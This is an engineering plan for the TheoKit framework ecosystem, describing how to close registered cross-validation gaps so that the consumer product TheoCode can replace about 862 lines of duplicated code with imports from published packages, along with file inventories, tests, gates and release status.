---
slug: crossval-4-6-absorption
created_at: 2026-08-15
goal: Close the 17 registered cross-validation gaps across the TheoKit ecosystem and adopt each in TheoCode
---

# Plan: Close the 17 cross-validation gaps and adopt them in TheoCode

> **Version 2.0 — the Goal changed, and that is the point.** The owner restated the objective in the terms the exercise actually started from: *an "EmpresaCode" must not reimplement what TheoKit already ships, and building one must be simple.* v1.x measured neither. It measured 17 test assertions and a score we compute ourselves — both of which the 2026-08-16 review proved could be green over broken work. The new Goal is a **deletion in someone else's repository**, which nobody here can declare on their own behalf. Everything below this line was written against the old Goal; the phases and tasks remain valid as *work*, but their ordering is superseded by the Goal's consequence clause. See `## Goal § Why the Goal changed`.
>
> **Version 1.2** — absorbs all 25 items from [`crossval-4-6-absorption-edge-cases-2026-08-16.md`](../reviews/crossval-4-6-absorption-edge-cases-2026-08-16.md): 7 MUST FIX, 15 SHOULD TEST, 3 accepted risks. One of them is not hardening. **EC-1 falsified a premise**: `TheokitAgentError` and `isTransientError` are *already* reachable from `@theokit/agents`, via the `export *` forward at `dist/index.d.ts:8` — verified by running the import (runtime: both `function`; types: clean under `strict`, exit 0). Registered gap 16 and the U-11 caveat both said otherwise because both grepped the `.d.ts` for the symbol and saw only an `import` — **grep does not follow `export *`**, and two runs of the same blind technique agreeing is not corroboration. T1.1 is therefore inverted from "add the re-export" to "pin the reachability and correct the record", the plan now closes **16** gaps rather than 17, and `Error model` is re-scored from 2,50 to 4,00 on the surviving evidence — which *raises* the projected average without any code. EC-2 is the same blindness reproduced in the plan's own parser and is fixed in T0.1. The remaining five MUST FIX: registry-before-unlink ordering (EC-3), single-pass template expansion so an inlined file cannot inject a shell segment (EC-4), rejecting `nth < 1` with a distinct error (EC-5), verifying the *expected* published version rather than that *a* version resolves (EC-6), and a sunset date that was 92 days against a 90-day cap (EC-7).
>
> **Version 1.1** — coverage audit against the database found the v1.0 matrix incomplete in two ways, both corrected here. (a) Three registered non-info findings (F60, F63, F64) were not rows, so the declared coverage of 91% was arithmetic over the wrong denominator — the true figure was 80% (20/25). (b) More seriously, four gaps were covered at *gap* granularity while their named sub-items had no task: ~205 LOC of `commands/`, ~100 of `consent/`, ~80 of `backtrack/` and ~130 of `components/` — ~515 LOC of the 862 the surface sweep named. Given Risk R3 (4,60 has zero slack), leaving them out held `Slash commands` and `Terminal & PTY UX` below 4,5, which are exactly the two the target needs. v1.1 adds T2.6, T2.7, T3.3, T3.4, extends T2.3 and T5.2, and corrects the matrix.
>
> **Version 1.0** — The 2026-08-15 cross-validation measured the TheoKit ecosystem against TheoCode — its only real consumer, already on `@theokit/agents ^9.4.0` — and scored **3,31/5** across 17 dimensions. The distribution is bimodal and that is the finding: everything the framework *built* scores 4,0–4,5; everything about whether a customer can *reach* what was built scores 1,5–2,5. **Nothing scored as never-built.** This plan closes all 17 registered gaps, adopts each one in TheoCode so the closure is proven by deleted lines rather than asserted, and installs the gate whose absence let every one of them happen: there is a CI gate watching the SDK→layer direction and none watching layer→consumer. The expected outcome is a re-scored weighted average of ≥ 4,6 with ~1.100 lines deleted from the consumer.

## Goal

> **Reduce what a coding-agent product must build for itself**, measured by a deletion that either happens or does not: **TheoCode's duplicated-capability code falls from ~862 LOC to ≤ 150**, with its own suite green and every deleted line replaced by an import from a published package.

**Second half, deliberately un-numbered until measured:** a newcomer scaffolding `create-theokit --surface=tui` must reach TheoCode's core loop — tools, approval gate, session resume — without writing framework-shaped code. **No baseline exists**: nobody has ever run that scaffold as a newcomer and recorded where they got stuck. The number is therefore established by T0.2 before it can be a target. Inventing one here would be the fabricated precision this plan keeps catching elsewhere.

### Why the Goal changed (v2.0)

v1.x measured **17/17 closure assertions** and a **weighted score ≥ 4,60**. Both are artifacts this project controls, and during the 2026-08-16 review both were demonstrated false while green:

- the register reported **33/33 passing** while measuring the *predecessor* plan's twelve gaps;
- it stays green against a `dist/` built **before** the breaking change it is supposed to guard;
- three of its "closure assertions" contain only `expect.fail('unreachable while blocked')` behind an early return — no assertion at all;
- it derives its own `17` from "the Coverage Matrix has 20 rows"; the matrix has **29**, and it omits the one gap marked *critical*;
- the score is analyst judgement, and its baseline had to be corrected from 3,31 to 3,37 mid-cycle because one registered gap turned out never to have been a gap.

The failure is structural, not a set of bugs to fix: **a goal whose metric we compute about ourselves can be fully green while the customer keeps rewriting the framework by hand.** At the moment of this rewrite the plan can truthfully report "17 tasks committed, 11/17 assertions executed" while TheoCode has deleted **zero** lines. Both statements are true. Only one answers the question the whole exercise exists to answer.

A deletion cannot be faked. If TheoCode removes 700 lines and its suite stays green, the framework absorbed those capabilities in a form a real consumer can use. If it removes none, nothing was absorbed — however many assertions are green.

**Consequence:** `17/17` and `≥ 4,60` are **demoted from goal to derived indicator**. They remain useful for locating work and worthless as proof. No phase of this plan is complete because they are green.

**Consequence for ordering:** the work that serves this Goal is (1) stop deleting live data, (2) publish so the consumer can adopt, (3) make the consumer delete. Instrument repair — the remaining review findings about registers, parity gates and evidence files — is genuinely third. It was first in v1.x, which is how a slice that fixed a data-loss defect ended a session with zero lines deleted anywhere.

## Context

The question that motivated the measurement was: *if a customer builds an "EmpresaCode" with all of TheoCode's capabilities, would they have to rebuild something that should be in TheoKit?*

The answer is **yes, ~1.500 lines — and none of it because a capability is missing.** After the 9.4.0 absorption (published and adopted; the reference HEAD is literally `chore(deps): @theokit/agents 9.4.0 — as três migrações entram em vigor`), the consumer's own upstream register `BACKLOG.md:421-441` lists 8 gaps as open and **zero are fully open** when verified against today's published surface: 7 closed and reachable, 2 closed in the wrong shape, 1 half-closed. Two the consumer already adopted without updating the row.

The damage splits three ways, and the middle two are the expensive ones:

| Category | LOC in the consumer | Instance |
|---|---:|---|
| Built, **unreachable** | ~536 | auto-approve rule (250) · MCP OAuth (286) |
| Built, **wrong shape** | ~1.058 | cross-project GC + liveness oracle (858) · `forkBeforeUserTurn` (200) |
| Built, **not findable** | — | 8 "open" rows against capabilities that ship |
| Missing surface primitive | ~292 | three name-keyed tool maps |
| **Never built** | **0** | — |

The root cause is structural and this repository already half-diagnosed it. `scripts/check-surface-parity.mjs` is honest about covering "1 of 6 applicable" subpaths, and by construction it can only ask *does the layer forward what the SDK exports at the same subpath name*. The 14 subpaths that are the layer's **own inventions** are skipped with a written reason — correctly, since the question is undefined there. The consequence: a capability the layer invents can ship as a type with its enforcement private, and nothing notices the consumer rebuilt it. `ApprovalPosture` and `TheokitAgentError` are the two live instances.

**Correction to the cross-validation report, measured during this plan's Step 1 and carried here rather than silently fixed.** The report's gap 22 said `@theokit/tui` "publishes no per-tool result renderer", and its dimension-27 suggestion proposed shipping a usage panel. Both are wrong: `theokit-tui/src/index.ts:53-55,94-102` exports `ToolResult`, `ToolCardResult` (a `diff | output | preview` discriminated union), `CostMeter` and `TokenUsageChart`. The real gap is narrower — the consumer's `tool-header.ts` (292 LOC) holds **three maps keyed by tool names the framework owns** (`HEADERS_BY_TOOL:34`, `BODY_BY_TOOL:90`, `APPROVAL_LABELS:192`) — and the usage panel is correct product composition at 31 LOC. This plan scopes to the maps and drops the panel (parsimony rung 1).

## Baseline Context (deep review of current state)

Measured 2026-08-15. Framework HEAD `3d55d34f`; `theokit-tui` HEAD `a0d47d7`; `theokit-sdk` HEAD `90ca4eeb6`; TheoCode HEAD `08155d8` on branch `workspace`.

### Files that will be touched — framework (`theokit`)

| File | LoC today | Last commit (sha + date) | Why it exists today | Invariants to preserve |
|---|---|---|---|---|
| `wiki/capability-index.md` | 95 | `939141d9` (2026-08-14) | Need→symbol map created after the 2026-08-14 run measured 5 shipped capabilities being reimplemented | The `Landed` column contract (min version a consumer needs) stays; rows only gain accuracy |
| `tests/integration/crossval-gaps.test.ts` | 512 | `e55b3523` (2026-08-14) | Executable gap register — one assertion per registered gap | Existing 12 assertions keep passing; `noteSkip('G10')` behaviour on unbuilt `dist` stays |
| `packages/agents/src/errors.ts` | 18 | `ee9fb7b1` (2026-07-24) | Re-exports the SDK's `ConfigurationError` so `instanceof` holds across the seam (ADR-0006) | The single-class re-export stays working; adding exports never removes |
| `packages/agents/src/index.ts` | 367 | `7667597a` (2026-08-14) | Root barrel; `:18` re-exports `ConfigurationError`; `:139-141` declares the SDK boundary closed | Bundle ceiling 35K (stated at `:1`); the barrel only grows by type-light symbols |
| `packages/agents/src/tools-entry.ts` | 134 | `ca70a9ca` (2026-08-15) | The `./tools` subpath — explicit named re-exports of `@theokit/sdk-tools` | The explicit-names discipline (`:14-16`) stays; enriching never reduces |
| `packages/agents/src/bridge/approval-posture.ts` | 220 | `3b5941ab` (2026-08-14) | M96 U1 — the four-variant `ApprovalPosture` and `applyPosture`'s fail-closed refusal | `applyPosture`'s runtime refusal when `confinedBy.enforced === false` stays; the four variants stay exhaustive |
| `packages/agents/src/bridge/index.ts` | 177 | `1ab7b498` (2026-08-14) | `./bridge` barrel; `:70` exports `ApprovalPosture` as a type | No narrowing of current exports |
| `packages/agents/src/session/session-lifecycle.ts` | 333 | `b023cef8` (2026-08-15) | Session lifecycle; `forkBeforeUserTurn`, `protectedTranscripts`, `deleteSession`'s sync-remover refusal at `:236-239` | The `SessionRegistryRemoverError` refusal of a silently-truthy thenable stays — it closed a real silent-success bug; `nth` stays 1-based |
| `packages/agents/src/session/gc/transcript-gc.ts` | 275 | `3ceeaf4d` (2026-08-14) | Transcript GC with retention floor + plan/apply; `TranscriptGCOptions.cwd:96`, `rmSync:263` | The 4 GC invariants and the `GCFloorError` refusal stay; dry-run stays the default |
| `packages/agents/src/session/index.ts` | 43 | `b30fe9f1` (2026-08-15) | `./session` barrel | No narrowing of current exports |
| `scripts/check-surface-parity.mjs` | 336 | `c9735140` (2026-08-15) | M86 surface-parity gate; reads subpaths from both `exports` maps rather than a hand list | The "decision, not coverage" contract (`:16-24`) MUST NOT become a coverage demand; the anti-vacuity floor stays |
| `packages/agents/package.json` | 132 | `3d55d34f` (2026-08-15) | `@theokit/agents@9.4.0`; 20 export subpaths | `exports` only grows; `files` only grows |
| `CLAUDE.md` | 342 | `939141d9` (2026-08-14) | Ecosystem table, declared source of truth for wired seams; already carries a 2026-08-14 correction note admitting it names 5 of 11 repos | The table's role as source-of-truth-for-seams is either completed or explicitly demoted, never left contradictory |
| `tests/unit/surface-invention-gate.test.ts` (NEW) | 0 | — | (to be created — the layer→consumer assertion) | — |
| `packages/agents/src/bridge/approval-decision.ts` (NEW) | 0 | — | (to be created — the callable predicate) | — |
| `packages/agents/src/session/gc/registry-remover.ts` (NEW) | 0 | — | (to be created — the async remover seam) | — |
| `packages/agents/src/ask/pending-ledger.ts` | 114 | `3b5941ab` (2026-08-14) | `createPendingLedger` — the surface-side memory of what was already shown and answered | The ledger stays surface-owned; the framework never reads its payload |
| `packages/agents/src/ask/index.ts` | 51 | `3b5941ab` (2026-08-14) | The `./ask` subpath entry; its docstring at `:12-16` states the framework/surface split | No narrowing; the two-halves rationale stays |
| `packages/agents/src/config/custom-commands.ts` | 260 | `339852de` (2026-08-15) | `loadCustomCommands` — reads command files, nested dirs and frontmatter | Frontmatter and nested-dir behaviour (landed `d6a59285`, `339852de`) unchanged |
| `packages/agents/src/config-entry.ts` | 97 | `d9899a77` (2026-08-15) | The `./config` subpath entry — **already shipping, 34 symbols** | No narrowing |
| `packages/agents/src/config/command-template.ts` (NEW) | 0 | — | (to be created — the template expander) | — |
| `packages/agents/src/session/transcript-root-hint.ts` (NEW) | 0 | — | (to be created — the migration hint) | — |

### Files that will be touched — siblings

| File | LoC today | Repo HEAD | Why it exists today | Invariants to preserve |
|---|---|---|---|---|
| `../theokit-tui/src/index.ts` | 263 | `a0d47d7` | Public barrel — 190 symbols incl. `ToolResult:53`, `ToolCardResult:54`, `CostMeter:101`, `TokenUsageChart:94` | No narrowing; `VERSION` tracks the published bump |
| `../theokit-tui/src/tool-header-map.ts` (NEW) | 0 | `a0d47d7` | (to be created — default name→header/body/approval maps) | — |
| `../theokit-sdk/packages/sdk/src/internal/mcp/oauth.ts` | 286 | `90ca4eeb6` | MCP PKCE + refresh, reachable from no package | The PKCE flow itself is untouched — only its reachability changes |
| `../theokit-sdk/packages/sdk/package.json` | 431 | `90ca4eeb6` | SDK exports map | Existing subpaths keep resolving |
| `../theokit-sdk/packages/sdk/tsup.config.ts` | 123 | `90ca4eeb6` | Build entry list | Existing entries keep building |
| `../theokit-tui/src/select-list-model.ts` | 125 | `b4f399f` (2026-08-08) | `WindowView` with `hiddenBefore`/`hiddenAfter` counts, shipped in 0.53.0 (U-10 half A) | The default anchor stays trailing — an opt-in option, never a re-anchoring |
| `../theokit-tui/src/keyboard-help-model.ts` (NEW) | 0 | — | (to be created — capability-derived shortcut list) | — |
| `../theokit-sdk/packages/sdk/src/internal/auth/credential-store.ts` | (mask at `:122-137`) | `90ca4eeb6` | `assertSecureModes` — the exported permission check | Whatever mask is chosen, the check and the directory creator MUST agree |
| `../theokit-sdk/packages/sdk/src/internal/persistence/transcript-ops.ts` | (`readJsonlTail` at `:161-177`) | `90ca4eeb6` | Tail reader with `sinceMarker` | `tolerateTrailingPartialLine` behaviour untouched |

### Files that will be touched — consumer (`TheoCode`, adoption phase)

| File | LoC today | Last commit (sha + date) | Why it exists today | Invariants to preserve |
|---|---|---|---|---|
| `packages/tui/src/consent/approval-mode.ts` | 44 | `2329373` (2026-08-15) | `shouldAutoApprove(mode, tool, posture)` + `ApprovalMode` — the duplicated safety rule, TUI copy | The B-006 semantics: an absent posture counts as unconfined; `auto-edit` stays bounded by the tool's write scope |
| `packages/agent/src/config/approval-policy.ts` | 56 | `41125d1` (2026-08-14) | `resolveHeadlessApproval` — the same rule, headless copy | Refusal instead of claiming a confinement that does not exist |
| `packages/agent/src/session/gc/all-sessions.ts` | 442 | `2329373` (2026-08-15) | The `--all-projects` sweep | The injected `opts.listProjects()` seam stays product-owned |
| `packages/agent/src/session/liveness-oracle.ts` | 188 | `1578995` (2026-08-08) | ALIVE/DEAD/UNDETERMINED with a shared DFS node budget | The measured budget behaviour (13.269 dirs, ~3.200 fallthrough) survives the move |
| `packages/agent/src/session/backtrack.ts` | 175 | `2329373` (2026-08-15) | The compaction-aware turn window the framework's fork lacks | The three corrections (skip non-turn records, respect `compact_boundary`, skip goal-continuation markers) survive |
| `packages/tui/src/backtrack/backtrack.ts` | 119 | `2df6f0e` (2026-08-08) | Backtrack UI state machine over the window | `armed`-last ordering (B-029) stays |
| `packages/agent/src/tools/view-image.ts` | 49 | `a94304c` (2026-08-14) | The only local tool in a 10-tool registry | Its `outputSchema`/`toModelOutput` image-block split is the behaviour to preserve after switching to the framework factory |
| `packages/tui/src/formatting/tool-header.ts` | 292 | `cd58ed1` (2026-08-09) | Three name-keyed maps: `HEADERS_BY_TOOL:34`, `BODY_BY_TOOL:90`, `APPROVAL_LABELS:192` | The product's wording stays overridable after adopting defaults |
| `packages/tui/src/commands/subagent-inventory.ts` | 42 | `8e5b131` (2026-08-10) | The second reader `listSubagentNames` was built to delete | — (file is deleted) |
| `packages/agent/src/config/sandbox-policy.ts` | 27 | `616f645` (2026-08-07) | Second oracle over the SDK's three-mode vocabulary (U-6) | — (file is deleted) |
| `packages/agent/src/config/trust-store.ts` | (contains the 20-LOC gate at `:39-49`) | — | Narrowed to world-write on measurement: umask 002 yields 0775 and `~/.theokit` is 0775 on a real machine | Whatever mask the framework adopts must not refuse a 0775 `~/.theokit` |
| `packages/tui/src/commands/command-template.ts` | 112 | `2329373` (2026-08-15) | `$N` placeholders, quote-aware arg split, `` !`shell` ``, `@file` inline at a 64 KB cap — zero framework imports | The cap and the quote-trimming behaviour survive the move |
| `packages/tui/src/consent/pending-approvals.ts` | 87 | `cd58ed1` (2026-08-09) | The surface-side ledger that survives because `createPendingLedger` has no payload slot | Its per-question render state keeps working, as a ledger payload |
| `packages/tui/src/backtrack/BacktrackOverlay.tsx` | 91 | `0ebc989` (2026-08-08) | The rewind ladder; `:22-24` calls the boolean-only overflow an SDK gap (now stale — counts shipped in 0.53.0) | The stale comment is corrected when the centred anchor is adopted |
| `BACKLOG.md` | 5540 | `243873e` (2026-08-12) | Holds the upstream register U-1..U-11 | Rows are closed with evidence, never deleted |

### Test files, gates and artifacts created by this plan

All NEW unless marked. LoC 0, no prior commit — listed separately to keep the tables above readable, following the precedent set by `crossval-absorption-gaps-plan.md`. **Pre-flight path validation** (Step 0): `tests/unit/**` and `tests/integration/**` are discovered by the root `vitest.config.ts` projects at `:28` and `:45`; `packages/agents/tests/**` is discovered by that package's own `vitest run`. `scripts/__tests__/*.test.mjs` has **no precedent in this repo**, which is why every gate's test lives under `tests/unit/` instead — a path decision forced by the runner config, not a preference.

| File | Created by | Purpose |
|---|---|---|
| `packages/agents/tests/unit/error-base-reachable.test.ts` | T1.1 | `TheokitAgentError` importable from the layer; `instanceof` across the seam |
| `packages/agents/tests/unit/tools-surface-parity.test.ts` (EXTENDED) | T1.2 | Image-tool shape equivalence + the symbol-count claim |
| `../theokit-sdk/packages/sdk/tests/mcp-auth-subpath.test.ts` | T1.3 | The MCP OAuth subpath resolves from the built package |
| `packages/agents/tests/unit/approval-decision.test.ts` | T2.1 | B-006 scar, unknown tool, `applyPosture` regression |
| `packages/agents/tests/unit/gc-registry-remover.test.ts` | T2.2 | Async remover, separate registry failure, timeout, dry-run |
| `../theokit-sdk/packages/sdk/tests/credential-store-modes.test.ts` | T2.4 | The check accepts a home the framework created |
| `../theokit-sdk/packages/sdk/tests/transcript-tail-marker.test.ts` | T2.5 | Marker as record type, not substring |
| `packages/agents/tests/unit/session-fork.test.ts` (EXTENDED) | T2.3 | Fixtures gain tool results, a continuation marker and a `compact_boundary`; previews/fork agreement |
| `packages/agents/tests/unit/transcript-root-hint.test.ts` | T2.6 | The five `undefined` paths |
| `packages/agents/tests/unit/pending-ledger-payload.test.ts` | T2.7 | Payload round-trip, thread grouping, default type argument |
| `../theokit-tui/src/tool-header-map.test.ts` | T3.1 | Default coverage, unknown-name fallback, partial override |
| `packages/agents/src/session/liveness-oracle.ts` | T3.2 | (source, NEW — the absorbed classifier) |
| `packages/agents/tests/unit/liveness-oracle.test.ts` | T3.2 | Budget exhaustion ⇒ UNDETERMINED; the scale-independent property |
| `packages/agents/tests/fixtures/projects/` | T3.2 | Synthetic project tree at reduced scale |
| `packages/agents/tests/unit/command-template.test.ts` | T3.3 | Placeholders, quoting, cap truncation, no direct spawn |
| `../theokit-tui/src/keyboard-help-model.test.ts` | T3.4 | Unbound capability omitted |
| `../theokit-tui/src/select-list-model.test.ts` (EXTENDED) | T3.4 | Both anchors, both clamped ends |
| `scripts/check-invention-reachability.mjs` | T4.1 | The layer→consumer gate |
| `rules/invention-reachability-allowlist.txt` | T4.1 | Deliberate type-only exports, with mandatory sunsets |
| `tests/unit/surface-invention-gate.test.ts` | T4.1 | Gate behaviour incl. expired-allowlist re-fire |
| `scripts/check-changelog-closes.mjs` | T4.3 | The `closes: U-N` convention check |
| `tests/unit/changelog-closes.test.ts` | T4.3 | Convention check behaviour; released sections never read |
| `TheoCode: packages/tui/src/consent/approval-mode.test.ts` (RETARGETED) | T5.1 | B-006 asserted against the framework symbol |
| `.claude/knowledge-base/audits/2026-08-15-theocode-crossval.md` | T5.4 | Promotes the report out of gitignored `cross-validation-output/` so citations resolve in a fresh clone |
| `cross-validation-output/scoring/dimension_scores.md` (EXISTING) | T5.4 | Re-scored with unchanged weights and shown arithmetic |

Consumer files touched in Phase 5 beyond those tabled above: `TheoCode/packages/agent/package.json` and `packages/tui/package.json` (floor bump, T5.1), `TheoCode/packages/agent/src/tools/registry.ts` (framework factory import, T5.2), `TheoCode/packages/agent/src/session/gc/per-session.ts` (pass `Agent.delete` as remover, T5.3), and the `TheoCode/packages/tui/src/components/` adopters of the centred window and shortcut list (T5.2) — enumerated per file during implementation, since which components consume them is decided by the adoption, not by the plan.

### Current callers / dependents

- **Symbol:** `applyPosture` in `packages/agents/src/bridge/approval-posture.ts:116`
  **Callers (production):** `packages/agents/src/bridge/sdk-adapter.ts:684` — the sole caller
  **Callers (tests):** `packages/agents/tests/unit/approval-posture-evidence.test.ts:43,56,73,87`; `packages/agents/tests/unit/factory-guardrails-139.test.ts`
  **External:** no — it is re-exported by nothing, which is the gap.

- **Symbol:** `ApprovalPosture` (type) in the same file, exported at `packages/agents/src/bridge/index.ts:70`
  **External:** yes — `@theokit/agents/bridge` is a published subpath. TheoCode does not import it (verified: zero `ApprovalPosture` in `TheoCode/packages`).

- **Symbol:** `forkBeforeUserTurn` in `packages/agents/src/session/session-lifecycle.ts`
  **Callers (production, in-repo):** none
  **Callers (tests):** `packages/agents/tests/unit/session-fork.test.ts:83,89,98`
  **External:** yes — `./session` is published. TheoCode wraps it as `forkSessionBeforeUserTurn` and calls it from `packages/tui/src/backtrack/backtrack.ts:9-13`.

- **Symbol:** `runTranscriptGC` / `planTranscriptGC` in `packages/agents/src/session/gc/transcript-gc.ts:161,237`
  **Callers (production, in-repo):** none
  **Callers (tests):** `packages/agents/tests/unit/transcript-gc-protection.test.ts:131,145`; `tests/unit/transcript-gc.test.ts:134,147`
  **External:** yes — published via `./session`; TheoCode's `session/gc/per-session.ts` consumes it.

- **Symbol:** `TheokitAgentError` — imported by all 29 error classes from `@theokit/sdk/errors`; re-exported by **nothing** in the layer.
  **External:** the consumer imports zero symbols from `@theokit/sdk`, pinned by `TheoCode/packages/shared/src/agent.test.ts:52` ("82 imports of `@theokit/agents`, 0 of `@theokit/sdk`"), re-verified today.

- **Symbol:** `ConfigurationError` re-exported at `packages/agents/src/errors.ts:18`
  **Callers (production):** `packages/agents/src/index.ts:18`, `capability/agent-capabilities.ts`, `bridge/agent-compiler.ts`, `capability/capabilities.ts`, `capability/toolbox.ts`

**Every symbol this plan changes has zero in-repo production callers and real cross-repo consumers.** That is the shape of the whole problem and it dictates the sequencing: correctness cannot be proven inside this repo, only in the adoption phase.

### Domain glossary

- **layer** — `@theokit/agents`, which composes `@theokit/sdk` + `sdk-tools` + `sdk-pty` + `presenter` into one surface with 20 export subpaths. The consumer's API is the layer's subpath list, not the SDK's.
- **subpath** — an entry in `package.json#exports` (e.g. `./session`). The package barrel is not the API; a symbol not on a subpath is unreachable to a consumer.
- **pass-through / re-export decision** — the parity gate's vocabulary: every SDK symbol at a shared subpath needs a written decision (`covered`, `re-exported`, `via-AuthProvider`, or out-with-reason).
- **layer invention** — a capability the layer creates that has no SDK counterpart (`ApprovalPosture`, session GC, hooks engine). The parity gate cannot ask a parity question about these, which is why they need the inverse gate.
- **approval posture** — what a surface does when a gated tool asks for approval: `interactive | auto-approve | auto-reject | owned-by-surface`. Never absence.
- **backtrack / fork-before-turn** — re-running a conversation from before the Nth user turn by forking the transcript at that record index.
- **compact_boundary** — the transcript marker after which earlier records have left the model's window; any turn-counting that ignores it counts turns the user can no longer reach.

### Architecture boundaries affected

- **G1 dependency direction** (`rules/system-design-guardrails.md`) — unchanged. Nothing new flows upward; `@theokit/agents` keeps depending on the SDK and never on `theokit` core.
- **G2 / `rules/sdk-runtime.md`** — the SDK stays the only agent runtime. Every item in this plan is either a re-export, a pure predicate over existing values, a seam signature change, or a presentation default. **No LLM call, no tool dispatch, no second conversation store.** The liveness oracle (T3.2) is the one item that adds real logic to the layer, and it is filesystem classification, not runtime.
- **G7 every export has a consumer** — every new export in this plan ships with a test in the same task and a consumer in the adoption phase.
- **The `@theokit/agents` boundary declaration at `index.ts:139-141`** is narrowed from "closed" to a measured statement (T4.2). This is a documentation-of-fact change, not a layering change.
- **Cross-repo**: `theokit-tui` gains a module; `theokit-sdk` publishes an existing internal subpath. Neither changes direction.

## Prior Art & Related Work

- **Blueprint `m67-layered-boundary-passthrough`** (`.claude/knowledge-base/discoveries/blueprints/m67-layered-boundary-passthrough-blueprint.md`) — the investigation that proved the ROADMAP claim *"custo de correção: re-export puro"* was **wrong**: the eight symbols did not exist in the consumed SDK version, so the boundary was not badly designed but *impassable*. It also measured, by downloading and grepping each published tarball, that the floor was 4.49.0. **Directly consumed by D6**: the same discipline applies here — before planning a re-export, verify the symbol exists in the version we consume. `@theokit/agents` now depends on `@theokit/sdk 4.52.1`, so the fifteen holes at `index.ts:139` are genuinely crossable today, unlike in August.
- **Blueprint `ecosystem-integration-guarantee` (M48)** — established the drift-guaranteed seam posture: cross-repo contract test (consumer + producer), type-assignability gate on the local mirror, closed peer range, boot-time fail-fast. **Consumed by D2**: the inverse gate is the missing fourth member of that family, applied to layer inventions instead of SDK forwards.
- **Blueprint `theocode-baseline-gaps`** and **`theocode-loop-adoption-gap`** — prior measurements of this same axis, useful as the record of which gaps were known before and stayed open.
- **Audit `2026-08-14-theocode-crossval.md`** — the first run (3,11/5, 12 gaps) and the source of the three-category framing (absent / present-but-unreachable / absorbed-with-the-wrong-shape) this plan inherits.
- **Audit `2026-08-15-theocode-100pct-adoption.md`** — the run that changed method to three lenses and measured 9 of 13 collisions delegating. Its § "What was measured and deliberately NOT changed" is load-bearing for D7: the `context/rules.ts` migration was written and reverted because four contracts changed at once.
- **Plan `crossval-absorption-gaps` (v1.1)** — the predecessor plan, whose `tests/integration/crossval-gaps.test.ts` (512 LOC) this plan extends rather than replaces, and whose EC-review lesson ("absorb the consumer's scar tissue, not just its interface") is D5's rationale.
- **Patterns skills** — scanned. The only `*-patterns` skill present is `theokit-http-decorators-pattern-from-nestjs-patterns`, whose `description` triggers on `@theokit/http-decorators`, NestJS decorator bridges, `defineRoute`, and `theokit generate controller`. **No keyword overlap with this plan's title or Goal** (gap absorption, export reachability, session GC, approval posture). Recorded explicitly so the absence is a measured decision, not an omission.
- **`rules/parsimony-ladder.md`** — applied at rung 1 and 4 during Step 1 and it changed the plan: the usage-panel task was **deleted** because `CostMeter` and `TokenUsageChart` already ship, and gap 22 narrowed from "no result renderer" to "three name-keyed maps" because `ToolResult` and `ToolCardResult` already ship.

## Objective

**Re-ordered for v2.0.** The list is now sequenced by what the Goal needs, not by what is convenient to verify. O1–O3 are the Goal; O4–O6 serve it; O7–O9 are instruments and are explicitly last.

- [x] **O1 — Stop deleting live data.** The liveness oracle never returns `dead` on evidence it cannot support: not from a colliding recorded `cwd`, not from a stat it could not perform, not from an attacker-plantable transcript field. Blocks everything else, because publishing before this arms the consumer's GC.

  **Closed 2026-08-16** (`01735c72`, `50f5da79`). One regression test per clause —
  `test_a_live_sibling_cwd_outweighs_a_gone_one_in_the_same_collision_class`,
  `test_a_stat_that_could_not_be_performed_is_never_absence`,
  `test_a_planted_transcript_cannot_condemn_a_live_project` — and the suite was verified by
  MUTATION rather than by being green, because the round-one suite was green and caught neither
  defect: reverting the probe's catch to `found: false` now fails 1 test, collapsing `undefined`
  to `false` fails 2. Re-measured on the real tree afterwards (13 624 projects): agreement 99,96%
  and `framework_dead_where_consumer_disagreed == 0` — every disagreement is the framework being
  less certain, never more, which is the asymmetry the clause is about.
- [ ] **O2 — The consumer can adopt.** The three packages publish, so `@theokit/agents`, `@theokit/tui` and `@theokit/sdk` carry the closures at a version TheoCode can pin. Nothing about this plan is provable while the work sits above the published version.

  **Cut but not published, 2026-08-16.** Versions are computed, committed and pushed —
  `@theokit/agents` 9.4.0 → **10.0.0** (major earned: `deleteSession` and `runTranscriptGC` ship
  SYNCHRONOUS in the published 9.4.0, verified with `npm pack`), `theokit` 0.48.2 → **0.48.3**,
  `@theokit/sdk` 4.52.1 → **4.53.0**. Every pre-publish gate is green: credential preflight
  (`usetheodev`, read-write on both packages per `npm access list collaborators`), version-collision
  guard (none of these exists on the registry), `workspace:`-protocol guard, full build, and the new
  symbols confirmed present in the `dist` that would ship rather than a stale one.

  Two blockers remain, and neither is code:

  1. **`npm publish` is refused by the agent harness**, not by npm. The credential can publish; the
     command is what is gated. It needs a human to run `pnpm release` in each repo.
  2. **CI has not run on this repo since 2026-08-15** — 0 successes in 40 runs, every job failing at
     "Set up job" with *"recent account payments have failed or your spending limit needs to be
     increased"*. `theokit` is private and bills minutes; the public `theokit-sdk` sibling is green,
     which is what isolates the cause. So the release would ship without a green CI. The local
     substitute is recorded rather than skipped: 6 452 tests in this repo and 4 378 in the SDK, both
     at 0 failures, with the data-loss and security fixes verified by MUTATION because in three of
     them the suite was green and caught nothing.

  The `unreleased` rows in [`wiki/capability-index.md`](../../../wiki/capability-index.md) stay
  `unreleased` until the publish actually happens. Writing `10.0.0` there first would be the exact
  defect class this plan spent the session removing — a claim the artifact does not support.
- [ ] **O3 — The consumer deletes.** TheoCode's duplicated-capability code falls from ~862 LOC to **≤ 150**, its suite stays green, and every deleted line is replaced by an import. **This is the Goal.** Its `BACKLOG.md` upstream register reaches zero open rows, each closed with a commit as evidence.
- [ ] **O4 — A newcomer reaches the same place.** `create-theokit --surface=tui` gets a developer to tools + approval gate + session resume without writing framework-shaped code. **Baseline first (T0.2): nobody has run this as a newcomer**, so the target number is measured, not declared.
- [ ] **O5 — Wrong-shape primitives accept the shape the consumer needs** — GC remover seam, `forkBeforeUserTurn`, `assertSecureModes` mask, `readJsonlTail` marker, approval decision, per-tool presentation maps. Each is a precondition of a specific deletion in O3, and is done when that deletion lands, not when it compiles.
- [ ] **O6 — A closure reaches a consumer by mechanism, not by shared maintainer.** Every gap-closing CHANGELOG entry names the consumer gap id it closes. TheoCode shares a maintainer with the framework; a real customer does not, and five closures reached it by accident.
- [ ] **O7 — Capabilities are findable.** The capability index tells the truth — zero fabricated rows, guard matching declared exports including `export *` — and covers the packages a consumer needs, not one of them.
- [ ] **O8 — Layer inventions are reachable**, enforced by a CI gate, so the next `ApprovalPosture` cannot ship as a type with its enforcement private.
- [ ] **O9 — The instruments stop lying.** The closure register asserts against a fresh build, derives its own count from the Coverage Matrix, and counts a blocked gap as blocked. **Demoted from Goal to hygiene:** green instruments proved compatible with broken work, so they no longer gate anything.

## ADRs

